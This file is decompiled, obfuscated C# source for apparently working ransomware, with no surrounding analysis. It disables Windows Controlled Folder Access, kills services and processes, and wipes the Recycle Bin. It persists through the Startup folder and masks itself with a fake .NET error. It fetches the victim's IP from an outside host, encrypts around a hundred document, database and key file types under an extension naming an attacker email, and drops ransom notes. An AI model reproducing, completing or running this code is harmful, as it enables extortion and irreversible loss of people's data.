	public static string znrzVMXfyF = "NO";

	public static string mzFZROUPCs = "NO";

	public static string HdgZavBuQbPUc = "NO";

	public static string TaWgCeBZApPnLE = "NO";

	public static string opsKUtpNJQMy = "NO";

	public static string iCDbdsmAlj = "NO";

	public static List<string> mmwwbJcgsinbY = new List<string> { "docx", "pdf", "xlsx", "csv" };

	public static string JIGROLQVWX = "NO";

	public static string vipECknmzJcQpaojf = "1";

	public static string OPPyOqaNxsJGE = "NO";

	public static string xvvKjbKLLTy = "NO";

	public static string VwESwqFCAUbNCFKfa = "NO";

	public static string NvFwATUTUQMIT = string.Empty;

	public static string KoQDprrWRLMrvX = "NO";

	public static string DAHkSRqYYCx = "NO";

	public static string SHMOIUKcdDfdLrdwP = "NO";

	public static string hTMfIBaogsvJWJP = "";

	public static string FxgLGzTAUhfzz = "";

	public static string HddAAtwCxjJY = "NO";

	public static string zvPDGsjiSeakqn = "NO";

	public static string eCpqZNFzXBk = "YES";

	public static string RhtjzptQdIB = "NO";

	public static string vNyWYyzFikOW = "NO";

	public static string xAPXnynGHHB = "LOGONISOFF";

	public static string nQYWmsBKPLwJlDMj = "NO";

	public static string SKNqqvnwPFsJKeOF = "NO";

	public static string nYSVBrcSXYk = "mystartup.lnk";

	public static string cldhKnYBxdoqe = "NO";

	public static string FobSEPYXhZfl = "NO";

	public static string tlbMaTgRdTiY = "YES";

	public static string AoHprIWbHuW = "NO";

	public static string hqGTpuvOSSOWk = "VGhhbm9z";

	public static string lnMRwhnXgj = "YES";

	public static string ucJfPpnsurBYM = "NO";

	public static string FfquseXmmDfG = "NO";

	public static string fVxCtVNEqI = "NO";

	public static string[] pnydbOeVSrTJCV = new string[0];

	public static string fujYaOkcjcopB = "NO";

	public static bool SzzYxwPSWbpgYR = true;

	public static string QuSEAUvSahFoy = "NO";

	public static bool IMmsNGvAyQxjH = false;

	public static bool scKRevUuzGg = false;

	public static bool eYVbrywhchyAE = false;

	public static bool VqFeNuGuCaa = false;

	public static string lNABZjYJLaAdehz = "Debug_Log.txt";

	public static bool TQcDMEBrjpu = false;

	public static bool FDlrjWPxRIj = false;

	public static bool hMMaqtUhULPSvAd = false;

	public static bool bNvfnEokSS = false;

	public static bool bzjwNDHoswJy = true;

	public static string EtMWnOTDeEqM = "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + JuDOdZAEhCW.rCActRevxiz() + ".txt";

	public static bool QPmKNZZswIrG = false;

	public static Stopwatch GRXGrNKCkkg = new Stopwatch();

	public static int jNleUmpCYwQx = 0;

	public static int SSvZxDydUbgEQF = 0;

	public static bool MaDqJNywoPHCL = false;

	public static string iWOdpoHPpDBfd = ".[ID-" + JuDOdZAEhCW.rCActRevxiz() + "]";

	public static string[] EiCIwnNxUuR = new string[1] { "\"db\",\"dbf\",\"accdb\",\"dbx\",\"mdb\",\"mdf\",\"epf\",\"ndf\",\"ldf\",\"1cd\",\"sdf\",\"nsf\",\"fp7\",\"cat\",\"log\"" };

	public static List<string> SyqwnpfhIlEpjOk = new List<string>();

	public static int ZtHZstDoJGDmq = 0;

	private static void Main(string[] args)
	{
		try
		{
			string kdLhkMtSUTNvZ = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process p) => p.ProcessName == kdLhkMtSUTNvZ) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			aYjATqRqhB.kCYMpRoUopW(aQFRrxDuMZBx);
		}
		catch (Exception)
		{
		}
		try
		{
			if (lnMRwhnXgj == "YES")
			{
				Thread thread = new Thread(rWNDjtdbypHTVOXe.aHOHKClvmhfzqie);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (YDHMyiOEyqX == "YES")
		{
			Thread.Sleep(int.Parse(mrapiWSgiWYZ));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && opsKUtpNJQMy == "YES")
		{
			try
			{
				rztAbSfyMNmnUlfq(PBGxcXGgCq("U2V0LU1wUHJlZmVyZW5jZSAtRW5hYmxlQ29udHJvbGxlZEZvbGRlckFjY2VzcyBEaXNhYmxlZA=="));
			}
			catch
			{
			}
		}
		try
		{
			if (GGptfJYKCmzVa == "YES" && GXKXZAlMCwu.MClTYHaGAVD())
			{
				new YgKGzAuqlliO().mhHwBLVwexsQh(CPXtOELfXQJNL: false);
				GXKXZAlMCwu.uaBXIFXNPiAVxh();
			}
		}
		catch (Exception)
		{
		}
		if (QvIfhPMXPMl == "YES" && GXKXZAlMCwu.MClTYHaGAVD())
		{
			new YgKGzAuqlliO().mhHwBLVwexsQh(CPXtOELfXQJNL: false);
			new YgKGzAuqlliO().bLXDJEhGwaNlI();
		}
		if (QMWnzMKZLW == "YES")
		{
			FuyzLgddfiJCWt.ymYTPDDthQuPPXfb();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\";
			string text2 = text + Path.GetFileName(fileName);
			if (GXLaZgEsdW == "YES" && fileName != text2)
			{
				Thread thread2 = new Thread(YPcTZLomdmP);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (Evwzlxkvbpc == "YES" && mainModule != null && fileName != text2)
			{
				try
				{
					rMALBdwsAruJ = sDILiadrEXxHc(0, HLnyjlZkORUZl.Count);
					File.Copy(fileName, text + HLnyjlZkORUZl[rMALBdwsAruJ], overwrite: true);
					Process.Start(text + HLnyjlZkORUZl[rMALBdwsAruJ]);
					ONKwLvQmArXFz();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (hPMezbtNCii == "YES" && DateTime.Now < kSYdplAigquFgpb)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (LKKeAczwGI == "YES" && DateTime.Now > QpxyRESzFaCPTr)
			{
				ONKwLvQmArXFz();
			}
		}
		catch
		{
		}
		HSpgdytfLGz();
		Thread thread3 = new Thread((ThreadStart)delegate
		{
			Parallel.ForEach(GdxeGEIwnI, delegate(string ZcgxcbCKfdX)
			{
				beVAbavcTbJwdi(PBGxcXGgCq("c2MuZXhl"), ZcgxcbCKfdX);
			});
			Parallel.ForEach(eXHMwtDYRimS, delegate(string AEVikQmhtGF)
			{
				beVAbavcTbJwdi(PBGxcXGgCq("dGFza2tpbGwuZXhl"), AEVikQmhtGF);
			});
			if (fVxCtVNEqI == "YES")
			{
				Parallel.ForEach(pnydbOeVSrTJCV, delegate(string kqmKTUTwJAnqoQ)
				{
					beVAbavcTbJwdi(PBGxcXGgCq("dGFza2tpbGwuZXhl"), "/IM " + kqmKTUTwJAnqoQ + " /f");
				});
			}
			if (!woUJzlRoAzGo().Contains("XP"))
			{
				vvpYtdlvuXBO(MJpSZxsXZLloG);
			}
			else
			{
				Parallel.ForEach(seztnJtLWJCaQk, delegate(string ugxZwHAoLQ)
				{
					beVAbavcTbJwdi(PBGxcXGgCq(JMzNoXUpAyhmZ("lhXZu4WatRWYzNnd")), ugxZwHAoLQ);
				});
			}
			Parallel.ForEach(QluxYAwyymIIcs, delegate(string NrlAVWMOpWWTUnm)
			{
				beVAbavcTbJwdi(PBGxcXGgCq("ZGVsLmV4ZQ=="), NrlAVWMOpWWTUnm);
			});
		});
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		if (zvPDGsjiSeakqn == "NO")
		{
			bkKppWlQwlw();
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && eYVbrywhchyAE)
			{
				try
				{
					Thread thread4 = new Thread(bDoUOtvlleOB.tHkIHQvMSuCiwmCA);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			beVAbavcTbJwdi("cmd.exe", PBGxcXGgCq("L2MgcmQgL3MgL3EgJVNZU1RFTURSSVZFJVxcJFJlY3ljbGUuYmlu"));
		}
		SecureString secureString = new SecureString();
		if (znrzVMXfyF == "NO")
		{
			Random random = new Random();
			for (int i = 0; i < 32; i++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					i--;
				}
			}
		}
		else
		{
			YhMcuhCOiUkEzc = "C36VJRCS6BRRUS1L4DZT54LQRDS10YDW";
		}
		sBFHyRlKWnP = uGlqoxFdzAjPTYcF.PzkQOghKIFRgh(QywKiKOHqvWU(secureString));
		if (hMMaqtUhULPSvAd)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), EtMWnOTDeEqM)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), EtMWnOTDeEqM), string.Concat(PBGxcXGgCq("Q2xpZW50IElQOiA="), new WebClient().DownloadString(PBGxcXGgCq("aHR0cDovL2ljYW5oYXppcC5jb20=")), "\r\n", PBGxcXGgCq("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), DateTime.Now, "\r\n", PBGxcXGgCq("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), sBFHyRlKWnP));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), EtMWnOTDeEqM), "\r\nAdditional KeyID: " + sBFHyRlKWnP);
				}
			}
			catch (Exception ex7)
			{
				if (TQcDMEBrjpu)
				{
					try
					{
						File.AppendAllText(lNABZjYJLaAdehz, "Error while creating Local Report: " + ex7.Message + "\r\n");
					}
					catch (Exception)
					{
					}
				}
			}
		}
		mqdnfCIjhG.oIbZaRuoJQwtj(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), nYSVBrcSXYk), KKxNWAYnHHPM(sBFHyRlKWnP), null, null, "Installer...", "Ctrl+Shift+X", null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			jKmLqcFVOKeOF();
		}
		try
		{
			try
			{
				if (QPmKNZZswIrG)
				{
					Console.WriteLine("Files securing is about to start...");
				}
			}
			catch
			{
			}
			FbGSptYfpFqIW(new string[1] { "[auto]" }, new string[100]
			{
				"dat", "txt", "jpeg", "gif", "jpg", "png", "php", "cs", "cpp", "rar",
				"zip", "html", "htm", "xlsx", "xls", "avi", "mp4", "ppt", "doc", "docx",
				"sxi", "sxw", "odt", "hwp", "tar", "bz2", "mkv", "eml", "msg", "ost",
				"pst", "edb", "sql", "accdb", "mdb", "dbf", "odb", "myd", "php", "java",
				"cpp", "pas", "asm", "key", "pfx", "pem", "p12", "csr", "gpg", "aes",
				"vsd", "odg", "raw", "nef", "svg", "psd", "vmx", "vmdk", "vdi", "lay6",
				"sqlite3", "sqlitedb", "java", "class", "mpeg", "djvu", "tiff", "backup", "pdf", "cert",
				"docm", "xlsm", "dwg", "bak", "qbw", "nd", "tlg", "lgb", "pptx", "mov",
				"xdw", "ods", "wav", "mp3", "aiff", "flac", "m4a", "csv", "sql", "ora",
				"mdf", "ldf", "ndf", "dtsx", "rdl", "dim", "mrimg", "qbb", "rtf", "7z"
			}, new string[0], QywKiKOHqvWU(secureString), ".secure[editpower@criptext.com]");
		}
		catch (Exception ex9)
		{
			if (TQcDMEBrjpu)
			{
				try
				{
					File.AppendAllText(lNABZjYJLaAdehz, "Finish process: " + ex9.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt"))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt");
				streamWriter.WriteLine(PBGxcXGgCq("WW91ciBmaWxlcyBhcmUgc2VjdXJlZC4uLg0KV3JpdGUgeW91ciAiS2V5IElkZW50aWZpZXIiIGZyb20gUkVTVE9SRV9GSUxFU19JTkZPLnR4dCB0byB0aGlzIGVtYWlsOiANCg0KZWRpdHBvd2VyQGNyaXB0ZXh0LmNvbQ0Kb3INCndpbGxldHRhbW9mZmF0QHlhaG9vLmNvbQ=="));
				streamWriter.WriteLine("\r\n");
				streamWriter.WriteLine(PBGxcXGgCq("S2V5IElkZW50aWZpZXI6IA=="));
				streamWriter.WriteLine(sBFHyRlKWnP);
				if (AkiFFGXREV == "NO")
				{
					streamWriter.WriteLine("\r\n");
					streamWriter.WriteLine(PBGxcXGgCq("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(wkqobNaWEQAr.Count));
				}
				if (MaDqJNywoPHCL)
				{
					streamWriter.WriteLine("\r\n");
					streamWriter.WriteLine(PBGxcXGgCq("UEMgSGFyZHdhcmUgSUQ6IA=="));
					streamWriter.WriteLine(JuDOdZAEhCW.rCActRevxiz());
				}
			}
			else
			{
				string text3 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt");
				if (!text3.Contains(sBFHyRlKWnP) && !IMmsNGvAyQxjH)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt", "\r\nAdditional KeyId:\r\n" + sBFHyRlKWnP);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in IVpIyrutgXnuTsdC)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + "\\RESTORE_FILES_INFO.txt"))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt", item + "\\RESTORE_FILES_INFO.txt", overwrite: true);
				}
				else
				{
					string text4 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt");
					if (!text4.Contains(sBFHyRlKWnP) && !IMmsNGvAyQxjH)
					{
						File.AppendAllText(item + "\\RESTORE_FILES_INFO.txt", "\r\nAdditional KeyId:\r\n" + sBFHyRlKWnP);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!VqFeNuGuCaa && num > 10)
			{
				break;
			}
		}
		if (tlbMaTgRdTiY == "YES")
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta"))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta");
					streamWriter2.WriteLine(PBGxcXGgCq("PGh0bWw+CjxoZWFkPgoJPHRpdGxlPjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CjxwIHN0eWxlPSJ0ZXh0LWFsaWduOmNlbnRlciI+PGltZyBhbHQ9IiIgc3JjPSJodHRwczovL2Nkbi5tb3MuY21zLmZ1dHVyZWNkbi5uZXQvdTh3U0hNbU1NWHpadUFGQkNtY3NDSy02NTAtODAuanBnIiBzdHlsZT0iaGVpZ2h0OjQwM3B4OyB3aWR0aDo2NTBweCIgLz48L3A+Cgo8cCBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXIiPiZuYnNwOzwvcD4KCjxwcmUgc3R5bGU9InRleHQtYWxpZ246Y2VudGVyIj4KPHNwYW4gc3R5bGU9ImZvbnQtc2l6ZToxOHB4Ij48c3Ryb25nPllvdXIgZmlsZXMgYXJlIHNlY3VyZWQuLi48L3N0cm9uZz48L3NwYW4+PHNwYW4gc3R5bGU9ImZvbnQtc2l6ZToxNnB4Ij4KPHNwYW4gc3R5bGU9ImZvbnQtc2l6ZToxNHB4OyI+d3JpdGUgdG8gdXMgd2l0aCB5b3VyICZxdW90O0tleSBJZGVudGlmaWVyJnF1b3Q7IGZyb20gUkVTVE9SRV9GSUxFU19JTkZPLnR4dCA8c3Ryb25nPnRvIHRoaXMgZW1haWw8L3N0cm9uZz48L3NwYW4+PC9zcGFuPjxzcGFuIHN0eWxlPSJmb250LXNpemU6MTRweDsiPjo8L3NwYW4+Cgo8c3BhbiBzdHlsZT0iZm9udC1zaXplOjE2cHgiPjxzcGFuIHN0eWxlPSJjb2xvcjojMjk4MGI5Ij5lZGl0cG93ZXJAY3JpcHRleHQuY29tPC9zcGFuPjwvc3Bhbj4Kb3IKPHNwYW4gc3R5bGU9ImZvbnQtc2l6ZToxNnB4Ij48c3BhbiBzdHlsZT0iY29sb3I6IzI5ODBiOSI+d2lsbGV0dGFtb2ZmYXRAeWFob28uY29tPC9zcGFuPjwvc3Bhbj4KIAo8L3ByZT4KPC9ib2R5Pgo8L2h0bWw+"));
					streamWriter2.WriteLine("\r\n");
					streamWriter2.WriteLine(PBGxcXGgCq("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPktleSBJZGVudGlmaWVyOiA="));
					streamWriter2.WriteLine(sBFHyRlKWnP + PBGxcXGgCq("PC9wPg=="));
					if (AkiFFGXREV == "NO")
					{
						streamWriter2.WriteLine("\r\n");
						streamWriter2.WriteLine(PBGxcXGgCq("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + PBGxcXGgCq("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(wkqobNaWEQAr.Count) + PBGxcXGgCq("PC9wPg=="));
					}
					if (MaDqJNywoPHCL)
					{
						streamWriter2.WriteLine("\r\n");
						streamWriter2.WriteLine(PBGxcXGgCq("UEMgSGFyZHdhcmUgSUQ6IA=="));
						streamWriter2.WriteLine(JuDOdZAEhCW.rCActRevxiz());
					}
				}
				else
				{
					string text5 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt");
					if (!text5.Contains(sBFHyRlKWnP) && !IMmsNGvAyQxjH)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta", PBGxcXGgCq("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + "\r\nAdditional KeyId:\r\n" + sBFHyRlKWnP + PBGxcXGgCq("PC9wPg=="));
					}
				}
			}
			catch
			{
			}
		}
		if (ojgHTSkbqSFk == "YES")
		{
			try
			{
				if (AkiFFGXREV == "NO")
				{
					JuDOdZAEhCW.mveDRIVdtHD("URL", "USERNAME", "ACCESO", string.Concat(PBGxcXGgCq("Q2xpZW50IElQOiA="), new WebClient().DownloadString(PBGxcXGgCq("aHR0cDovL2ljYW5oYXppcC5jb20=")), "\r", PBGxcXGgCq("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), DateTime.Now, "\r\n", PBGxcXGgCq("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA=="), Convert.ToString(wkqobNaWEQAr.Count), "\r\n", PBGxcXGgCq("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), sBFHyRlKWnP));
				}
				else
				{
					JuDOdZAEhCW.mveDRIVdtHD("URL", "USERNAME", "ACCESO", string.Concat(PBGxcXGgCq("Q2xpZW50IElQOiA="), new WebClient().DownloadString(PBGxcXGgCq("aHR0cDovL2ljYW5oYXppcC5jb20=")), "\r", PBGxcXGgCq("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), DateTime.Now, "\r\n", PBGxcXGgCq("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA=="), Convert.ToString(wkqobNaWEQAr.Count), "\r\n", PBGxcXGgCq("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), sBFHyRlKWnP));
				}
			}
			catch
			{
			}
		}
		if (CncJLlWMgfz == "YES")
		{
			try
			{
				DsAbwoDoKJ.LJDfYXoYMzx(new Uri(""));
			}
			catch
			{
			}
		}
		if (tlbMaTgRdTiY == "NO")
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt"))
				{
					Process.Start(PBGxcXGgCq("bm90ZXBhZC5leGU="), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt");
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta"))
				{
					Process.Start(PBGxcXGgCq("bXNodGEuZXhl"), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta");
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(NvFwATUTUQMIT))
		{
			try
			{
				File.Delete(NvFwATUTUQMIT);
			}
			catch
			{
			}
		}
		if (TQcDMEBrjpu)
		{
			try
			{
				File.AppendAllText(lNABZjYJLaAdehz, "All Done!");
			}
			catch (Exception)
			{
			}
		}
		if (OkEuBkyazD == "EVET")
		{
			ONKwLvQmArXFz();
		}
	}

	public static void YPcTZLomdmP()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(PBGxcXGgCq("VGhpcyBwcm9ncmFtIHJlcXVpcmVzIE1pY3Jvc29mdCAuTkVUIEZyYW1ld29yayB2LiA0LjgyIG9yIHN1cGVyaW9yIHRvIHJ1biBwcm9wZXJseQ=="), PBGxcXGgCq("SW5mb3JtYXRpb24uLi4="), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int sDILiadrEXxHc(int IjiPayfHBEK, int VGPvecacuKbuSqGC)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(IjiPayfHBEK, VGPvecacuKbuSqGC);
	}

	public static List<string> oLgNOmJXCAjn(string TmdEDbPRtcHM, string[] LaoXsZpZrEqT, string srlyhDiDJuxlSK, string[] gKQaswueTmX, string nSDGLPDgIST)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(TmdEDbPRtcHM);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains("C:\\Program Files\\") && !text.Contains("C:\\Program Files (x86)\\") && !text.Contains(":\\Windows\\") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.Contains(":\\ProgramData\\") && !text.Contains("\\AppData\\") && !text.ToLower().Contains("msocache") && !text.ToLower().Contains("system volume information") && !text.ToLower().Contains("boot") && !text.ToLower().Contains("tor browser") && !text.ToLower().Contains("mozilla") && !text.ToLower().Contains("appdata") && !text.ToLower().Contains("google chrome") && !text.ToLower().Contains("application data"))
				{
					array = Directory.GetFiles(text);
					goto IL_0155;
				}
			}
			catch
			{
			}
			continue;
			IL_0155:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains("autoexec.bat") && !fileInfo.FullName.Contains("desktop.ini") && !fileInfo.FullName.Contains("autorun.inf") && !fileInfo.FullName.Contains("ntuser.dat") && !fileInfo.FullName.Contains("NTUSER.DAT") && !fileInfo.FullName.Contains("iconcache.db") && !fileInfo.FullName.Contains("bootsect.bak") && !fileInfo.FullName.Contains("boot.ini") && !fileInfo.FullName.Contains("ntuser.dat.log") && !fileInfo.FullName.Contains("thumbs.db") && !fileInfo.FullName.ToLower().Contains("bootmgr") && !fileInfo.FullName.ToLower().Contains("pagefile.sys") && !fileInfo.FullName.ToLower().Contains("config.sys") && !fileInfo.FullName.ToLower().Contains("ntuser.ini") && !fileInfo.FullName.Contains(PBGxcXGgCq("QnVpbGRlcl9Mb2c=")) && !fileInfo.FullName.Contains("RSAKeys") && !fileInfo.FullName.Contains("Config.enc") && !fileInfo.FullName.Contains("RESTORE_FILES_INFO") && !fileInfo.FullName.EndsWith(".secure[editpower@criptext.com]") && !fileInfo.FullName.EndsWith("exe") && !fileInfo.FullName.EndsWith("dll") && !fileInfo.FullName.EndsWith("EXE") && !fileInfo.FullName.EndsWith("DLL") && !fileInfo.FullName.Contains("Recycle.Bin") && !fileInfo.FullName.Contains(nYSVBrcSXYk) && !fileInfo.FullName.Contains(lNABZjYJLaAdehz) && !fileInfo.FullName.Contains(EtMWnOTDeEqM))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(CXqkSEvmuN) * 1024.0 * 1024.0 && RgPKXlISvWFja == "YES")
						{
							list.Add(fileInfo.FullName);
							ymQKAJaEzg(list, LaoXsZpZrEqT, srlyhDiDJuxlSK, gKQaswueTmX, nSDGLPDgIST);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && RgPKXlISvWFja == "NO")
						{
							list.Add(fileInfo.FullName);
							ymQKAJaEzg(list, LaoXsZpZrEqT, srlyhDiDJuxlSK, gKQaswueTmX, nSDGLPDgIST);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static List<string> ghikHZIUgftLs(string LooQguHeCQK)
	{
		List<string> list = new List<string>();
		DirectoryInfo directoryInfo = new DirectoryInfo(LooQguHeCQK);
		try
		{
			foreach (FileInfo item in directoryInfo.EnumerateFiles())
			{
				try
				{
					if (!item.FullName.Contains("C:\\Program Files\\") && !item.FullName.Contains("C:\\Program Files (x86)\\") && !item.FullName.Contains(":\\Windows\\") && !item.FullName.ToLower().Contains("perflogs") && !item.FullName.ToLower().Contains("internet explorer") && !item.FullName.Contains(":\\ProgramData\\") && !item.FullName.Contains("\\AppData\\") && !item.FullName.ToLower().Contains("autoexec.bat") && !item.FullName.ToLower().Contains("desktop.ini") && !item.FullName.ToLower().Contains("autorun.inf") && !item.FullName.ToLower().Contains("ntuser.dat") && !item.FullName.ToLower().Contains("iconcache.db") && !item.FullName.ToLower().Contains("bootsect.bak") && !item.FullName.ToLower().Contains("boot.ini") && !item.FullName.ToLower().Contains("ntuser.dat.log") && !item.FullName.ToLower().Contains("thumbs.db") && !item.FullName.ToLower().Contains("bootmgr") && !item.FullName.ToLower().Contains("pagefile.sys") && !item.FullName.ToLower().Contains("config.sys") && !item.FullName.ToLower().Contains("ntuser.ini") && !item.FullName.Contains(PBGxcXGgCq("QnVpbGRlcl9Mb2c=")) && !item.FullName.Contains("RSAKeys") && !item.FullName.Contains("RESTORE_FILES_INFO") && !item.FullName.EndsWith(".secure[editpower@criptext.com]") && !item.FullName.EndsWith("exe") && !item.FullName.EndsWith("dll"))
					{
						if (File.Exists(item.FullName) && (double)item.Length <= double.Parse(CXqkSEvmuN) * 1024.0 * 1024.0 && RgPKXlISvWFja == "YES")
						{
							list.Add(item.FullName);
						}
						else if (File.Exists(item.FullName) && RgPKXlISvWFja == "NO")
						{
							list.Add(item.FullName);
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch
				{
				}
			}
			foreach (DirectoryInfo item2 in directoryInfo.EnumerateDirectories("*"))
			{
				if (directoryInfo.FullName.ToLower().Contains("program files") || directoryInfo.FullName.ToLower().Contains(":\\windows") || directoryInfo.FullName.ToLower().Contains("perflogs") || directoryInfo.FullName.ToLower().Contains("internet explorer") || directoryInfo.FullName.ToLower().Contains("programdata") || directoryInfo.FullName.ToLower().Contains("appdata"))
				{
					continue;
				}
				try
				{
					foreach (FileInfo item3 in item2.EnumerateFiles("*", SearchOption.AllDirectories))
					{
						try
						{
							if (!item3.FullName.ToLower().Contains("autoexec.bat") && !item3.FullName.ToLower().Contains("desktop.ini") && !item3.FullName.ToLower().Contains("autorun.inf") && !item3.FullName.ToLower().Contains("ntuser.dat") && !item3.FullName.ToLower().Contains("iconcache.db") && !item3.FullName.ToLower().Contains("bootsect.bak") && !item3.FullName.ToLower().Contains("boot.ini") && !item3.FullName.ToLower().Contains("ntuser.dat.log") && !item3.FullName.ToLower().Contains("thumbs.db") && !item3.FullName.ToLower().Contains("bootmgr") && !item3.FullName.ToLower().Contains("pagefile.sys") && !item3.FullName.ToLower().Contains("config.sys") && !item3.FullName.ToLower().Contains("ntuser.ini") && !item3.FullName.Contains(PBGxcXGgCq("QnVpbGRlcl9Mb2c=")) && !item3.FullName.Contains("RSAKeys") && !item3.FullName.Contains("RESTORE_FILES_INFO") && !item3.FullName.EndsWith(".secure[editpower@criptext.com]") && !item3.FullName.EndsWith("exe") && !item3.FullName.EndsWith("dll"))
							{
								if (File.Exists(item3.FullName) && (double)item3.Length <= double.Parse(CXqkSEvmuN) * 1024.0 * 1024.0 && RgPKXlISvWFja == "YES")
								{
									list.Add(item3.FullName);
								}
								else if (File.Exists(item3.FullName) && RgPKXlISvWFja == "NO")
								{
									list.Add(item3.FullName);
								}
							}
						}
						catch (UnauthorizedAccessException)
						{
						}
						catch
						{
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch
				{
				}
			}
			return list;
		}
		catch (DirectoryNotFoundException)
		{
			return list;
		}
